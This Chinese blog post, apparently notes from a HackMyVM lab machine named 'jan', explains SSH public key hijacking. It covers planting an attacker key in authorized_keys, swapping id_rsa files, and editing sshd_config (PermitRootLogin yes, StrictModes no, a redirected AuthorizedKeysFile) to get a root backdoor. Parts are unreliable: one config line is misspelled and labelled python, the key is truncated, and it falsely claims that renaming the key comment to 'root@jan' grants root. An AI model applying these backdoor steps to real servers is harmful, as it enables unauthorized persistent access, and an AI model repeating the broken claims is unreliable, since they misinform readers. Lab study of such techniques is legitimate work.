---
title: SSH 公钥劫持
published: 2025-03-09 16:40:49
tags: [内网安全,提权思路]
category: 安全
draft: false
---

# SSH 公钥劫持

## SSH公钥劫持

该方法在`hmv`的靶机`jan`上使用过

### 原理

攻击者通过恶意手段替换或篡改目标系统中用于 `SSH` 认证的合法公钥，从而实现未经授权的远程访问。这种攻击方式通常是为了绕过常规的密码验证，获得持久性的后门访问

### 劫持的方式

1. **篡改 `.ssh/authorized_keys` 文件**
    - 将攻击者的公钥写入用户主目录下的 `~/.ssh/authorized_keys` 文件中。
    - 一旦写入，攻击者就可以通过对应的私钥访问目标系统。
2. 攻击者直接替换目标用户的 `~/.ssh/id_rsa.pub` 和 `~/.ssh/id_rsa` 文件，使用自己的密钥
3. 修改 `/etc/ssh/sshd_config`，强行允许攻击者的密钥
    
    ```python
    uthorizedKeysFile /root/.attack_keys
    ```
    

### 劫持root方法

需要能对`ssh_config` 和`sshd_config` 拥有修改权限

修改`sshd_config`配置文件

```bash
PermitRootLogin yes 
StrictModes no 
AuthorizedKeysFile      /home/ssh/.ssh/attack_keys
```

**StrictModes no**：禁用权限严格检查，避免因权限问题阻止 SSH 登录

然后将公钥最后的`xxx@xxx`改为`root@xxx`

```bash
9fglITVq2jKR2UXcDNIYyZeMLz5LU7bUdQluDYSU/LmJ2FsaT7KQ1EAnZbsOGrZlz9/U56c8J+58DvCxCpJVhf5yxQITD11DAVlZQpxX+Ws2n72Sp9Myxzm1s9/2DcA4aueVI/zc8gLuN/WpWcWs= ssh@jan
// change
9fglITVq2jKR2UXcDNIYyZeMLz5LU7bUdQluDYSU/LmJ2FsaT7KQ1EAnZbsOGrZlz9/U56c8J+58DvCxCpJVhf5yxQITD11DAVlZQpxX+Ws2n72Sp9Myxzm1s9/2DcA4aueVI/zc8gLuN/WpWcWs= root@jan
```

使用密钥文件进行登录，即可获得`root`权限